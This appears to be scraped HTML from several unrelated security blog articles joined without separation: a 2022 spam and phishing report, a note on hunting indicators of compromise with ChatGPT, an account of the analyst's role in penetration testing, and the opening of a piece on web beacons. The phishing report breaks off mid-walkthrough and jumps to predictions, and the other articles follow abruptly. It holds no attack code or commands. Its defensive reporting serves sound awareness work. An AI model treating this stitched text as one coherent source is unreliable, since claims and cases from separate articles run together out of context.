This increased usage meant the users&#8217; risk of losing personal data was now higher, too. &#8220;Well-wishers&#8221; who operated scam sites offered to check if Russian social media contained any embarrassing materials on the victim. The scam operators told the users it was possible to find damaging information about every third user of a social network by running a search. If the user agreed to a search to be done for them, they were told that a certain amount of dirty linen indeed had been found.

In a typical scheme of this kind, scammers find websites that offer registration, contact, or support request forms that do not require the user to be logged in to submit, and do not check the data entered. In some cases, they insert a scam message with a hyperlink in the login or name fields, and in others, add a longer text with images to the message field. Then the attackers add victims&#8217; email addresses to the contact fields and submit. When getting a message via a registration or contact form, most websites reply to the user&#8217;s email address that their request was received and is being processed, their account has been created, and so on. As a result, the person gets an automated reply from an official address of a legitimate organization, containing unsolicited advertisements or a scam link.</p>\n<p style=\"text-align: center;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/02/13144349/spam-phishing-report-2022-24.png\"><img alt=\"\" class=\"aligncenter size-large wp-image-108718\" height=\"433\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/02/13144349/spam-phishing-report-2022-24-1024x433.png\" width=\"1024\" /></a></p>\n<p>Most scam messages offer a compensation or prize to the recipient. For example, a spam email targeting Russian users promised an equivalent of $190\u20134200 in VAT refunds. To get the money, the victim was offered to open the link in the message. This scheme is a classic: a linked web page requests that the user pay a commission of under a dozen dollars, which is insignificant in comparison to the promised refund.

In such emails, attackers usually claim that the recipient has broken the law and demand money. In 2022, these mailings not only continued, but also evolved. For example, there was virtually no text in the messages: the user was either asked to open an attached PDF file to find out more, or they received threats in the form of an image with text. In addition, the geography of mailings widened in 2022.</p>\n<p>The essence of the message, as in similar emails sent earlier, was that a criminal case was going to be opened against the recipient due to allegedly visiting sites containing child pornography.</p>\n<p style=\"text-align: center;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/02/13150404/spam-phishing-report-2022-27.png\"><img alt=\"\" class=\"aligncenter size-large wp-image-108721\" height=\"560\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/02/13150404/spam-phishing-report-2022-27-1024x560.png\" width=\"1024\" /></a></p>\n<p>To avoid serious consequences, the attackers urged the victim to respond as soon as possible to the sender and &#8220;settle the matter&#8221;. Most likely, the scammers would ask for a certain amount of money to be paid in further correspondence for the victim&#8217;s name to be removed from the &#8220;criminal case&#8221;. In 2022, we blocked over 100,000 blackmail emails in various countries and languages, including French, Spanish, English, German, Russian and Serbian.</p>\n<h3 id=\"exploiting-the-news\">Exploiting the news</h3>\n<p>Spammers constantly use major world events in their fraudulent schemes. The 2022 geopolitical crisis was no exception. Throughout the year, we saw mailings aimed at English-speaking users proposing transferring money, usually to a Bitcoin wallet, to help the victims of the conflict in Ukraine. Scammers often demand the transfer of money to Bitcoin wallets, as it is more difficult to trace the recipient through cryptocurrency transactions than through the bank ones. Blackmail demanding payment in cryptocurrency used to prevail in spam. Now, attackers have started collecting Bitcoin for charity.</p>\n<p style=\"text-align: center;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/02/13150431/spam-phishing-report-2022-28.png\"><img alt=\"\" class=\"aligncenter size-full wp-image-108722\" height=\"905\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/02/13150431/spam-phishing-report-2022-28.png\" width=\"854\" /></a></p>\n<p>The news agenda was also used in other scam mailings. For example, in early July, our solutions blocked 300,000 emails where fraudsters were requesting help on behalf of a Russian millionaire, who allegedly wanted to invest money and avoid sanctions. Another mailing said that the European Commission had decided to give away a fund created by Russian oligarchs, and the email recipient might be lucky to get a piece of this pie.</p>\n<p style=\"text-align: center;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/02/13150458/spam-phishing-report-2022-29.jpg\"><img alt=\"\" class=\"aligncenter size-large wp-image-108723\" height=\"328\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/02/13150458/spam-phishing-report-2022-29-1024x328.jpg\" width=\"1024\" /></a></p>\n<p>More and more &#8220;business offers&#8221; are appearing among spam mailings, and they exploit the current information agenda. Due to economic sanctions in 2022, enterprising businessmen offered replacements for goods and services from suppliers who left the Russian market. For example, spammers actively advertised services of a company transporting people to Russia. The email text emphasized the fact that many transport companies refused to provide such services.</p>\n<p style=\"text-align: center;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/02/13153541/spam-phishing-report-2022-30.png\"><img alt=\"\" class=\"aligncenter size-large wp-image-108724\" height=\"477\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/02/13153541/spam-phishing-report-2022-30-1024x477.png\" width=\"1024\" /></a></p>\n<p>There were also spam mailings where various companies offered to replace popular international software with Russian equivalents or solutions developed in third countries. In addition, there were spam propositions for intermediary services to open a company or bank account in neighboring countries, such as Armenia, as well as offers of assistance in accepting payments from foreign partners.</p>\n<p style=\"text-align: center;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/02/13153600/spam-phishing-report-2022-31.png\"><img alt=\"\" class=\"aligncenter size-large wp-image-108725\" height=\"586\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/02/13153600/spam-phishing-report-2022-31-1024x586.png\" width=\"1024\" /></a></p>\n<p>The shortage of printer paper in Russia in March and April 2022 spawned a wave of related ads offering paper at discount prices.</p>\n<p style=\"text-align: center;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/02/13153622/spam-phishing-report-2022-32.png\"><img alt=\"\" class=\"aligncenter size-large wp-image-108726\" height=\"366\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/02/13153622/spam-phishing-report-2022-32-1024x366.png\" width=\"1024\" /></a></p>\n<p>Spammers in 2022 also actively marketed their promotional mailing services as alternative advertising to unavailable promotion via platforms such as Instagram. For example, in April we blocked around a million of such mailings.</p>\n<p>Against the backdrop of sanctions and the accompanying disruption of supply chains, there has been an increase in spam offering goods and services from Chinese suppliers. In 2022, our filter blocked more than 3.5 million emails containing such offers, and the number of them was growing, from around 700,000 in the first quarter to more than a million in the fourth.</p>\n<p style=\"text-align: center;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/02/13153708/spam-phishing-report-2022-33.png\"><img alt=\"\" class=\"aligncenter size-large wp-image-108727\" height=\"571\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/02/13153708/spam-phishing-report-2022-33-1024x571.png\" width=\"1024\" /></a></p>\n<h3 id=\"spam-with-malicious-attachments\">Spam with malicious attachments</h3>\n<p>Employees shifting to remote work during the pandemic and the associated growth of online communications spurred the active development of various areas of phishing, both mass and targeted. Attackers have become more active in imitating business correspondence, not only targeting HR-specialists and accountants, as before the pandemic, but also employees in other departments. In 2022, we saw an evolution of malicious emails masquerading as business correspondence. Attackers actively used social engineering techniques in their emails, adding signatures with logos and information from specific organizations, creating a context appropriate to the company&#8217;s profile, and applying business language. They also actively exploited off the current news agenda and mentioned real employees from the company supposedly sending the emails. Spammers faked their messages as internal company correspondence, business correspondence between different organizations, and even as notifications from government agencies.</p>\n<p style=\"text-align: center;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/02/13153731/spam-phishing-report-2022-34.png\"><img alt=\"\" class=\"aligncenter size-large wp-image-108728\" height=\"508\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/02/13153731/spam-phishing-report-2022-34-1024x508.png\" width=\"1024\" /></a></p>\n<p>Masking malicious emails as business correspondence has become a major trend in malicious spam in 2022. Attackers tried to convince the recipient that it was a legitimate email, such as a commercial offer, a request for the supply of equipment, or an invoice for the payment of goods. For example, throughout the year, we encountered the following scheme. Attackers gained access to real business correspondence (most likely by stealing correspondence from previously infected computers) and sent malicious files or links to all of its participants in response to the previous email. This trick makes it harder to keep track of malicious emails, and the victim is more likely to fall for it.</p>\n<p style=\"text-align: center;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/02/13153756/spam-phishing-report-2022-35.png\"><img alt=\"\" class=\"aligncenter size-large wp-image-108729\" height=\"626\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/02/13153756/spam-phishing-report-2022-35-1024x626.png\" width=\"1024\" /></a></p>\n<p>In most cases, either the <a href=\"https://securelist.com/qakbot-technical-analysis/103931/\" rel=\"noopener\" target=\"_blank\">Qbot</a> Trojan or <a href=\"https://securelist.com/emotet-modules-and-recent-attacks/\" rel=\"noopener\" target=\"_blank\">Emotet</a> was loaded when the malicious document was opened. Both can be used to steal user data, collect information about the corporate network, and spread additional malware, such as ransomware. Qbot also allows you to gain access to emails and steal them for further attacks.</p>\n<p>Mailings imitating notifications from various ministries and other government organizations have become more frequent in the Runet. Emails were often designed to take into account the specific activities of the organizations they were pretending to be. The sender&#8217;s addresses copied the logic of email addresses in the relevant agencies, and the malicious attachment was disguised as some kind of specialized document, such as &#8220;key points of the meeting&#8221;. For example, malicious code was found in one of these mailings that exploited a vulnerability in the Equation Editor module, the formula editor in Microsoft Office.</p>\n<p>The perpetrators did not ignore the news agenda. In particular, the malware was distributed under the guise of call-up &#8220;as part of partial mobilization&#8221; or as a &#8220;new solution&#8221; to safeguard against possible threats on the internet &#8220;caused by hostile organizations&#8221;.</p>\n<p>In the second case, the program installed on victim&#8217;s computer was in fact a crypto-ransomware Trojan.</p>\n<h2 id=\"two-stage-spear-phishing-using-a-known-phish-kit\">Two-stage spear phishing using a known phish kit</h2>\n<p>In 2022, we saw an increase in spear (or targeted) phishing attacks targeting businesses around the world. In addition to typical campaigns consisting of one stage, there were attacks in several stages. In the first email, scammers in the name of a potential client asked the victim to specify information about its products and services. After the victim responds to this email, the attackers start a phishing attack.</p>\n<p>Key facts:</p>\n<ul>\n<li>Attackers use fake Dropbox pages created using a well-known phishing kit</li>\n<li>The campaign targets the sales departments of manufacturers and suppliers of goods and services</li>\n<li>Attackers use SMTP IP addresses and <em>From</em> domains provided by Microsoft Corporation and Google LLC (Gmail)</li>\n</ul>\n<h3 id=\"statistics\">Statistics</h3>\n<p>The campaign began in April 2022, with malicious activity peaking in May, and ended by June.</p>\n<div class=\"js-infogram-embed\"></div>\n<p><em>Number of emails related to a two-step targeted campaign detected by Kaspersky solutions (<a href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/02/13161029/01-en-spam-report-2022-diagrams.png\" rel=\"noopener\" target=\"_blank\">download</a>)</em></p>\n<h3 id=\"how-a-phishing-campaign-unfolds\">How a phishing campaign unfolds</h3>\n<p>Attackers send an email in the name of a real trade organization requesting more information about the victim company&#8217;s products.

The email on the screenshot below is sent from an address in this domain, and the company name in the <em>From</em> field is different to its name in the signature.</p>\n<p style=\"text-align: center;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/02/13153835/spam-phishing-report-2022-36.jpg\"><img alt=\"Example of the first email\" class=\"aligncenter size-large wp-image-108730\" height=\"498\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/02/13153835/spam-phishing-report-2022-36-1024x498.jpg\" width=\"1024\" /></a></p>\n<p style=\"text-align: center;\"><strong><em>Example of the first email</em></strong></p>\n<p>It is worth noting that the use of free domains is not typical for spear phishing in the name of organizations, because such domains are rarely used in business. Most often in targeted attacks, attackers either use <a href=\"https://securelist.com/email-spoofing-types/102703/\" rel=\"noopener\" target=\"_blank\">spoofing of the legitimate domain</a> of the organization they are pretending to be, or register domains similar to the original one. In addition, Google and Microsoft are pretty quick in blocking email addresses spotted sending spam. This is the most likely reason why attackers used different addresses in the <em>From</em> header (where the email came from) and <em>Reply-to</em> header (where the reply will go when clicking &#8220;Reply&#8221; in your email client). This means the victim responds to another address, which may be located in another free domain, such as outlook.com. The address in the <em>Reply-to</em> header is not used for spam, and correspondence with it is initiated by the victim, so it is less likely to be blocked quickly.</p>\n<p>After victims respond to a first email, attackers send a new message, asking them to go to a file-sharing site and view a PDF file with a completed order, which can be found via the link.</p>\n<p style=\"text-align: center;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/02/13153858/spam-phishing-report-2022-37.jpg\"><img alt=\"An email with a phishing link\" class=\"aligncenter size-large wp-image-108731\" height=\"642\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/02/13153858/spam-phishing-report-2022-37-1024x642.jpg\" width=\"1024\" /></a></p>\n<p style=\"text-align: center;\"><strong><em>An email with a phishing link</em></strong></p>\n<p>By clicking the link, the user is taken to a fake site generated by a well-known phishing kit.

Scams promising compensation and payouts from government agencies, large corporations and banks are likely to remain popular among cybercriminals next year. The unpredictability of the currency market and departure of individual companies from specific countries&#8217; markets will likely affect the number of scams associated with online shopping. At the same time, the COVID-19 topic, popular with cybercriminals in 2020 and 2021, but already beginning to wane in 2022, will finally cease to be relevant and will be replaced by more pressing global issues.</p>\n<p>Recently, we&#8217;ve seen an increase in targeted phishing attacks where scammers don&#8217;t immediately move on to the phishing attack itself, but only after several introductory emails where there is active correspondence with the victim. This trend is likely to continue. New tricks are also likely to emerge in the corporate sector in 2023, with attacks generating significant profits for attackers.</p>"

Potential use cases that we noted during the research were as follows:</p>\n<ul>\n<li>Systems check for indicators of compromise\u2014especially if you still do not have EDR full of detection rules, and you need to do some digital forensics and incident response (DFIR);</li>\n<li>Comparison of a current signature-based rule set with ChatGPT output to identify gaps\u2014there always could be some technique or procedure that you as analysts just do not know or have forgotten to create a signature for.</li>\n<li>Detection of code obfuscation;</li>\n<li>Similarity detection: feeding malware binaries to ChatGPT and trying to ask it if a new one is similar to the others.</li>\n</ul>\n<p>A correctly asked question is half the answer\u2014experimenting with various statements in the question and model parameters may produce more valuable results even for hashes and domain names.</p>\n<p>Beware of false positives and false negatives that this can produce. At the end of the day, this is just another statistical neural network prone to producing unexpected results.</p>\n<p><a href=\"https://github.com/stvetro/HuntWithChatGPT\" rel=\"noopener\" target=\"_blank\">Download the scripts here to hunt for IoCs</a>.

In truth, it is not so simple, especially if you want a reliable test and useful results. While pentesters search for vulnerabilities and put a lot of effort into finding and demonstrating possible attack vectors, there is one more team member whose role remains unclear: the cybersecurity analyst. This professional takes a helicopter view of the target system to properly assess existing security holes and to offer the client a comprehensive picture of the penetration testing results combined with an action plan on how to mitigate the risks. In addition to that, the cybersecurity analyst formulates a plan in the business language that helps the management team, including the C-level, to understand what they are about to spend money on.</p>\n<p>Drawing on Kaspersky&#8217;s expertise with dozens of <a href=\"https://www.kaspersky.com/enterprise-security/security-assessment\" rel=\"noopener\" target=\"_blank\">security assessment</a> projects, we want to reveal the details of the analyst&#8217;s role on these projects: who they are, what they do, why projects carried out together by <strong>pentesters and an analyst</strong> are much more useful for clients.</p>\n<h2 id=\"who-is-an-analyst\">Who is an analyst?</h2>\n<p><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/02/09101939/Analyst_role_in_pentesting_team_01.png\"><img alt=\"\" class=\"aligncenter wp-image-108655\" height=\"713\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/02/09101939/Analyst_role_in_pentesting_team_01.png\" style=\"float: right; width: 50%; padding: 10px;\" width=\"870\" /></a>In general, an analyst is a professional who works on datasets. For example, we all know about financial analysts who evaluate the efficiency of financial management. There are more than one type of analyst in the field of information security:</p>\n<ul>\n<li>Security Operation Center analysts work on incident response and develop detection signatures in a timely fashion;</li>\n<li>Malware analysts examine malware samples;</li>\n<li>Cyberthreat intelligence analysts study the behavior of various attackers, diving deeper into their tactics and techniques.</li>\n</ul>\n<p>Speaking of the analyst on a security assessment project, their role is to link together the pentester, the manager, and the client. At Kaspersky for example, an analyst contributes to nearly all security assessment projects, such as penetration testing, application security assessment, red teaming, and other. The goals and target scope of these projects can be different: from searching for vulnerabilities in an online banking application to identifying attack vectors against ICS systems and critical infrastructure assets. Team composition can change, so the analyst works with experts from many areas, enriching the project and sharing the expertise with the client.</p>\n<h2 id=\"the-analysts-role-in-the-security-assessment-process\">The analyst&#8217;s role in the security assessment process</h2>\n<p>It is possible to distinguish the following stages of analyst work in the security assessment process:</p>\n<ul>\n<li>Advanced reconnaissance,</li>\n<li>Interpreting network scan results,</li>\n<li>Threat identification,</li>\n<li>Verification of threat modeling,</li>\n<li>Visualization,</li>\n<li>Vulnerability prioritization,</li>\n<li>Recommendations,</li>\n<li>Project follow-up.</li>\n</ul>\n<p>Next, we will go over each of these steps in detail.</p>\n<h3 id=\"advanced-reconnaissance\">Advanced reconnaissance</h3>\n<p>The analyst begins by gathering information about the organization before the security testing conducted by pentesters can begin. The analyst studies public resources to learn about the business systems and external resources, and collects technical information about the target systems: whether the software was custom-built, provided by a vendor, or created from an open-source codebase, what programming language was used, and so on. They also look up known data leaks that may link to client employees and compromised corporate credentials. Often, this data is offered for sale on the dark web, and the analyst&#8217;s job is to detect these mentions and warn the client. All this information is collected to discover potential attack vectors and negotiate a project scope with the client. Potential attack vectors will then be explored by pentesters. For example, publicly available employee data can be used for social engineering attacks or to gain access to company resources, and information about the software can be used to find known vulnerabilities.</p>\n<h4><em>Project case: The benefits of OSINT</em></h4>\n<p>Here is an example from one of our security assessment projects where information-gathering by the analyst helped to identify a new attack vector. The analyst successfully used the <a href=\"https://content.kaspersky-labs.com/se/media/en/business-security/enterprise/kaspersky-digital-footprint-intelligence-datasheet.pdf\" rel=\"noopener\" target=\"_blank\">Kaspersky Digital Footprint Intelligence service</a> to find compromised employee credentials on the dark web. With the client&#8217;s approval, a pentester attempted to authenticate with one of the company&#8217;s external services using these credentials and finding that they were valid. Seeing how the client&#8217;s network perimeter was highly secured and all public-facing services, properly protected with authentication, the case clearly demonstrated that even a well-hardened infrastructure could be vulnerable to OSINT and threat intelligence.</p>\n<p style=\"text-align: center;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/02/10115504/Analyst_role_in_pentesting_team_02.jpg\"><img alt=\"A diagram of the penetration testing project where the information gathering by the analyst helped to identify a new attack vector\" class=\"aligncenter size-large wp-image-108656\" height=\"515\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/02/10115504/Analyst_role_in_pentesting_team_02.jpg\" width=\"1024\" /></a></p>\n<p style=\"text-align: center;\"><strong><em>A diagram of the penetration testing project where the information gathering by the analyst helped to identify a new attack vector</em></strong></p>\n<h3 id=\"interpreting-scan-results\">Interpreting scan results</h3>\n<p>At this stage, we have agreed with the client on a project scope, and pentesters are running an instrumental network scan to identify the client&#8217;s public-facing services and open ports. In our experience, the state of network perimeter cybersecurity in most organizations is far from perfect, but due to project constraints, pentesters typically target only a small number of perimeter security flaws. The analyst examines the network scan outputs and highlights the key issues. Their goal is to gather detailed information about insufficient network traffic filtering, use of insecure network protocols, exposure of remote management and DBMS access interfaces, and other possible vulnerabilities. Otherwise, the client will not see the full picture.</p>\n<h3 id=\"threat-identification\">Threat identification</h3>\n<p>Information about all attack vectors that were successfully exploited during the test comes from the pentester, whereas the analyst transforms these to build a detailed report describing the vulnerabilities and security flaws. In the hands of the analyst, a description of each attack vector, enriched with evidence, screenshots and collected data, turns into detailed answers to the following questions:</p>\n<ul>\n<li>What vulnerabilities were found and how?</li>\n<li>What are the conditions for exploitation?</li>\n<li>Which component is vulnerable (IP address, port, script, parameter)?</li>\n<li>What exploit/utility was used?</li>\n<li>What was the result (data / access level / conditions for exploiting another vulnerability)?</li>\n</ul>\n<p>Notably, multiple vulnerabilities pieced together may result in a single attack vector leading from zero-level access to the highest privileges.</p>\n<h3 id=\"verification-of-threat-modeling\">Verification of threat modeling</h3>\n<p>After the previous stages are complete, the vulnerabilities should be grouped under categories. Below are a few examples:</p>\n<ul>\n<li>Web application vulnerabilities (SQL injection, XSS, CSRF);</li>\n<li>Access control misconfigurations (for example, excessive account privileges, use of the same local account on different hosts);</li>\n<li>Patch management issues (use of software that has known vulnerabilities).</li>\n</ul>\n<p>Next, all vulnerabilities and security misconfigurations will be converted into threats that can exploit these. Armed with the knowledge of the client&#8217;s business systems, the analyst can assess to which critical resources a cybercriminal will gain access in the event of an attack. Will the attacker be able to reach the client&#8217;s data, gain access to employees&#8217; personal data, or maybe to payment orders? For example, by gaining total control over the client&#8217;s internal infrastructure, including critical IT systems, an attacker can disrupt the organization&#8217;s business processes, while the ability to read arbitrary files on the client&#8217;s servers can lead to sensitive documents being stolen.</p>\n<h3 id=\"visualization\">Visualization</h3>\n<p>The analyst creates a diagram to visualize all of the pentester&#8217;s activities relating to the successful attack scenarios. This is an important time not just for the client, who clearly sees everything that happened (what vulnerabilities were exploited, which hosts were accessed, and what threats this led to), but also for the pentesters. This is because, looking at this level of detail, they can see vectors that previously went unnoticed, findings that the report missed, and attacks that can be launched in the future.</p>\n<h4><em>Project case: discovering an additional attack vector</em></h4>\n<p>During an internal penetration test, our experts found multiple vulnerabilities and obtained administrative privileges in the domain. However, while analyzing the output of the BloodHound tool, the analyst uncovered hidden relationships, stumbling on an attack path within an Active Directory environment. The analyst found that external contractors could escalate their privileges in the system due to Active Directory being misconfigured. Constrained by the project scope, the pentesters did not go on to gain access to contractor credentials, so they were not able to exploit said misconfiguration. The client greatly appreciated the discovery of the new attack vector.<br />\n<a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/02/10114455/Analyst_role_in_pentesting_team_03.png\"><img alt=\"\" class=\"aligncenter size-large wp-image-108681\" height=\"461\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/02/10114455/Analyst_role_in_pentesting_team_03-1024x461.png\" width=\"1024\" /></a></p>\n<p style=\"text-align: center;\"><strong><em>A project case where BloodHound tool output analysis revealed an additional attack vector</em></strong></p>\n<h3 id=\"vulnerability-prioritization\">Vulnerability prioritization</h3>\n<p>When all vulnerabilities and threats have been identified, an analyst moves on to the prioritization stage. At this step, it should be decided which vulnerabilities need fixing first. The simplest solution would be to prioritize those with the highest severity level, but it is not the correct one. There are situations where a &#8220;critical&#8221; vulnerability identified in a test web application does not cause the same amount of damage as a &#8220;medium&#8221; vulnerability in a critical system. An example is a vulnerability in an online bank whose exploitation can trigger a whole chain of interconnected vulnerabilities, which would allow the attacker to steal the clients&#8217; money.</p>\n<p>So, the analyst looks at the overall business impact of the attack vector and the risk level of the vulnerabilities involved. Next, they prioritize the vulnerabilities, starting with the ones that pose the most severe threats but are easiest and fastest to fix, and following with those which require major changes to the business processes and are a subject of strategic cybersecurity improvements. After that, the analyst arranges the list of vulnerabilities and recommendations in the order in which measures should be taken.</p>\n<p style=\"text-align: center;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/02/10115455/Analyst_role_in_pentesting_team_04.jpg\"><img alt=\"Vulnerabilities prioritization scheme\" class=\"aligncenter size-large wp-image-108658\" height=\"243\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/02/10115455/Analyst_role_in_pentesting_team_04.jpg\" width=\"1024\" /></a></p>\n<p style=\"text-align: center;\"><strong><em>Vulnerabilities prioritization scheme</em></strong></p>\n<h3 id=\"recommendations\">Recommendations</h3>\n<p>The analyst prepares recommendations, which are part of project deliverables and should consider the following:</p>\n<ul>\n<li>A timeframe for implementation:\n<ul>\n<li>Short term (&lt;1 month): easily implemented recommendations, such as installing security updates or changing compromised credentials;</li>\n<li>Medium term (&lt;1 year): the most important changes requiring significant effort such as, for example, enforcing strict network filtering rules, restricting access to network services and applications, or revising user privileges and revoking excessive ones;</li>\n<li>Long term (&gt;1 year): changing the architecture and business processes, implementing/improving security processes and controls, such as, for example, developing a robust procedure for periodical updates.</li>\n</ul>\n</li>\n<li>The client&#8217;s approach to certain systems and business processes;</li>\n<li>Industry best practices and cybersecurity frameworks.</li>\n</ul>\n<h3 id=\"project-follow-up\">Project follow-up</h3>\n<p>At the final stage, the analyst provides three levels of project deliverables:</p>\n<ul>\n<li><strong>An executive overview</strong> for C-level managers and decision-makers who represent the client.</li>\n<li><strong>Technical details</strong> of the security assessment for the client&#8217;s IS team, SOC officers, IT specialists, and other employees.</li>\n<li><strong>Machine-readable results</strong> that can be processed automatically or used in the client&#8217;s cybersecurity products.</li>\n</ul>\n<p style=\"text-align: center;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/02/10115446/Analyst_role_in_pentesting_team_05.jpg\"><img alt=\"Three levels of project deliverables\" class=\"aligncenter size-large wp-image-108659\" height=\"451\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/02/10115446/Analyst_role_in_pentesting_team_05.jpg\" width=\"1024\" /></a></p>\n<p style=\"text-align: center;\"><strong><em>Three levels of project deliverables</em></strong></p>\n<h2 id=\"conclusions\">Conclusions</h2>\n<p>In summary of the above, the main advantages of having an analyst on a security assessment project, as evidenced by our experience, are as follows:</p>\n<ul>\n<li>The ability to collect and analyze a large amount of data, whether found in external sources or received from pentesters;</li>\n<li>Pentester time savings: these team members may not be concerned with the final results or reports as such;</li>\n<li>Collaboration with the client&#8217;s SOC or blue team to check whether the attacks were noticed, and to capture the defenders&#8217; actions and the timing of the attacks;</li>\n<li>Visualization of the test results and translation of these into the business language.</li>\n</ul>\n<p>Last but not least, the analyst provides a detailed mitigation plan including short-term and long-term recommendations, and actions required for mitigating the discovered threats.

For all intents and purposes, we have grown accustomed to online service providers, marketing agencies, and analytical companies tracking our every mouse click, our social posts, browser and streaming services history. The collected data can be used for improving their user interfaces or the overall user experience, or to personalize ads.</p>\n<p>There exist various types of trackers meant for collecting different types of information: advertising (AdAgency) trackers, analytics (WebAnalytics) trackers, and so on. Most of these are largely used on websites and inside applications. There are more versatile trackers too, used on websites, inside applications, and even in e-mail. This article describes one of these tracker types: web beacons. We demonstrate what tracking systems&#8217; and companies&#8217; web beacons our security products (anti-tracking browser extensions and antispam technology) detect most often.</p>\n<h2 id=\"what-web-beacons-are\">What web beacons are</h2>\n<p>Web beacons, or web bugs, also known as tracker pixels or spy pixels, among other names, are tracking elements used on web pages, inside applications and in e-mail for checking that the user has accessed certain content (opened an e-mail or visited a web page). Their main purpose is to collect statistics and build analytical reports on the user&#8217;s activities.</p>\n<p>Web beacons on websites track visitors. Analytical marketing agencies or website owners themselves can use these to measure how well certain content or promotional campaigns performed, or how their audiences responded. Some websites use tracker pixels as watermarks for their content, for example, to track down illegal copies.</p>\n<p>The main purpose of web beacons in e-mail, just as those on websites, is to count users who interact with the content. For example, tracker pixels can be used to make a report on e-mail open rates. These help companies to find out which e-mail campaigns their users find interesting and which they do not. For example, if an e-mail campaign sees declining open rates, the company may choose to either replace the subject with something more eye-catching or clickbaity, or on the contrary, make it more matter-of-fact and informative.</p>\n<h2 id=\"how-web-beacons-work\">How web beacons work</h2>\n<p>A beacon on a web page is typically an image that loads from an external source. The size is usually one or even zero pixels, so invisible to the human eye. Hence the name: &#8220;spy pixel&#8221;. Additionally, the CSS display property can be set to &#8220;none&#8221; (do not display) to hide the image. Less common are JavaScript beacon implementations, such as <a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Beacon_API\" rel=\"noopener\" target=\"_blank\">Beacon API</a>: an interface that allows sending requests to a server without expecting a response.</p>\n<p style=\"text-align: center;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/02/03143224/Web_beacons_01.jpeg\"><img alt=\"Example of web beacon location in the HTML code of a website\" class=\"aligncenter size-full wp-image-108635\" height=\"199\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/02/03143224/Web_beacons_01.jpeg\" width=\"995\" /></a></p>\n<p style=\"text-align: center;\"><strong><em>Example of web beacon location in the HTML code of a website</em></strong></p>\n<p>E-mail web beacons are implemented in a similar way: invisible images are placed within the e-mail body, or JavaScript code is added in an HTML attachment.</p>\n<p style=\"text-align: center;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/02/03143301/Web_beacons_02.jpeg\"><img alt=\"Example of web beacon location in the HTML part of an e-mail\" class=\"aligncenter size-full wp-image-108636\" height=\"149\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/02/03143301/Web_beacons_02.jpeg\" width=\"887\" /></a></p>\n<p style=\"text-align: center;\"><strong><em>Example of web beacon location in the HTML part of an e-mail</em></strong></p>\n<p>When the web page or e-mail is opened, a request is sent to the web beacon server. If the web beacon is an image the request is to upload this image. Otherwise it is a request specified in the JavaScript code, usually one that doesn&#8217;t require a response. The following information is typically communicated to the server:</p>\n<ul>\n<li>Date and time of opening the web page or e-mail</li>\n<li>Operating system version</li>\n<li>Browser or e-mail client type and version</li>\n<li>Screen resolution</li>\n<li>IP address</li>\n</ul>\n<p style=\"text-align: center;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/02/03143337/Web_beacons_03.jpeg\"><img alt=\"Example of user data transmission\" class=\"aligncenter size-full wp-image-108637\" height=\"485\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2023/02/03143337/Web_beacons_03.jpeg\" width=\"883\" /></a></p>\n<p style=\"text-align: center;\"><strong><em>Example of user data transmission</em></strong></p>\n<h2 id=\"the-most-common-website-and-e-mail-beacons\">The most common website and e-mail beacons</h2>\n<p>We have analyzed the web beacons detected by our systems in December 2022, and ranked twenty companies whose beacons interacted with our users while browsing 